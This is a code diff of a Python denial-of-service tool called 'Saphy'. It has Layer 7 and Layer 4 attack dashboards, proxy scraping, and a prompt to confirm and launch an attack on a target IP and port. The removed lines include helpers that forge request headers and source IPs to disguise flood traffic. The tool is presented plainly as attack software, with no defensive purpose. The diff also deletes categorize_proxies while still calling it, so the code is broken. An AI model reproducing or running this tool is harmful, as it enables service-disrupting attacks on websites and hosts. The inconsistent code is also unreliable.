@@ -68,33 +68,6 @@ def get_connector(proxy, proxy_type):
 # Initialize colorama
 init(autoreset=True)
 
-def fake_ip():
-    return '.'.join(str(random.randint(1, 254)) for _ in range(4))
-
-def fake_headers(base_url, user_agents):
-    return {
-        "User-Agent": random.choice(user_agents),
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Referer": base_url,
-        "X-Bot-ID": str(random.randint(1000, 9999)),
-        "X-Forwarded-For": fake_ip(),
-        "Via": "1.1 proxy-bot"
-    }
-
-def categorize_proxies(proxy_list):
-    http, socks4, socks5 = [], [], []
-    for proxy in proxy_list:
-        if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", proxy):
-            if "socks4" in proxy.lower():
-                socks4.append(proxy.replace("socks4://", ""))
-            elif "socks5" in proxy.lower():
-                socks5.append(proxy.replace("socks5://", ""))
-            else:
-                http.append(proxy.replace("http://", ""))
-    return http, socks4, socks5
-
-
 # Load user agents
 def load_user_agents():
     with open('useragents.txt', 'r') as f:
@@ -349,7 +322,7 @@ def stats_dashboard(url, duration):
         prev_total = total
 
         os.system('cls' if os.name == 'nt' else 'clear')
-        print(f"{Fore.LIGHTYELLOW_EX}=== Saphy v1.0 - Attack Dashboard ==={Style.RESET_ALL}")
+        print(f"{Fore.LIGHTYELLOW_EX}=== Saphy v2.0 - Attack Dashboard ==={Style.RESET_ALL}")
         print(f"{Fore.LIGHTCYAN_EX}Target        : {url}")
         print(f"{Fore.LIGHTCYAN_EX}Time Left     : {int(end_time - time.time())}s")
         print(f"{Fore.LIGHTCYAN_EX}Total Requests: {total}")
@@ -507,7 +480,7 @@ async def main():
         user_agents = load_user_agents()
         
         http_proxies, socks4_proxies, socks5_proxies = categorize_proxies(scrape_proxies())
-        selected_type = "socks5"  
+        selected_type = "http"  
 
         if selected_type == "http":
             proxy_list = http_proxies
@@ -520,7 +493,7 @@ async def main():
             selected_type = "socks5"
 
         print(f"{Fore.LIGHTCYAN_EX}Proxies being used:")
-        for proxy in proxy_list[:100]:  
+        for proxy in proxy_list[:50]:  
             ip = proxy.split(":")[0]
             location = geo_ip(ip)
             print(f"{proxy} -> {location}")
@@ -550,9 +523,9 @@ async def main():
 
         await asyncio.gather(*tasks)
 
-        print(f"\n{Fore.GREEN}[+] Attack finished! Total: {counters['total']}, Success: {counters['success']}, Errors: {counters['error']}")
+    print(f"\n{Fore.GREEN}[+] Attack finished! Total: {counters['total']}, Success: {counters['success']}, Errors: {counters['error']}")
 
-    elif layer_choice == 2:
+    if layer_choice == 2:
         print(f"{Fore.LIGHTGREEN_EX}{'='*40}")
         print(f"{Fore.LIGHTGREEN_EX}        Layer 4 Attack Dashboard")
         print(f"{Fore.LIGHTGREEN_EX}{'='*40}")
@@ -580,28 +553,26 @@ async def main():
             6: "hybrid-l4"
         }
 
-
         mode = mode_map.get(mode_choice)
 
-        
-    if mode:
-        # Dashboard summary
-        print(f"\n{Fore.LIGHTCYAN_EX}{'-'*40}")
-        print(f"{Fore.CYAN}Target IP      : {target_ip}")
-        print(f"{Fore.CYAN}Target Port    : {target_port}")
-        print(f"{Fore.CYAN}Duration       : {duration} seconds")
-        print(f"{Fore.CYAN}Threads        : {threads}")
-        print(f"{Fore.CYAN}Attack Mode    : {mode}")
-        print(f"{Fore.LIGHTCYAN_EX}{'-'*40}")
+        if mode:
+            # Dashboard summary
+            print(f"\n{Fore.LIGHTCYAN_EX}{'-'*40}")
+            print(f"{Fore.CYAN}Target IP      : {target_ip}")
+            print(f"{Fore.CYAN}Target Port    : {target_port}")
+            print(f"{Fore.CYAN}Duration       : {duration} seconds")
+            print(f"{Fore.CYAN}Threads        : {threads}")
+            print(f"{Fore.CYAN}Attack Mode    : {mode}")
+            print(f"{Fore.LIGHTCYAN_EX}{'-'*40}")
 
-        confirm = input(f"{Fore.LIGHTGREEN_EX}Confirm and launch attack? (Y/n) > ").strip().lower()
-        if confirm == 'y' or confirm == '':
-            attack = Layer4Attack(target_ip, target_port, duration, threads)
-            attack.start_attack(mode)
+            confirm = input(f"{Fore.LIGHTGREEN_EX}Confirm and launch attack? (Y/n) > ").strip().lower()
+            if confirm == 'y' or confirm == '':
+                attack = Layer4Attack(target_ip, target_port, duration, threads)
+                attack.start_attack(mode)
+            else:
+                print(f"{Fore.LIGHTYELLOW_EX}Attack canceled by user.")
         else:
-            print(f"{Fore.LIGHTYELLOW_EX}Attack canceled by user.")
-    else:
-        print(f"{Fore.RED}[!] Invalid choice!")
+            print(f"{Fore.RED}[!] Invalid choice!")
 
 # Run Main
 if __name__ == "__main__":
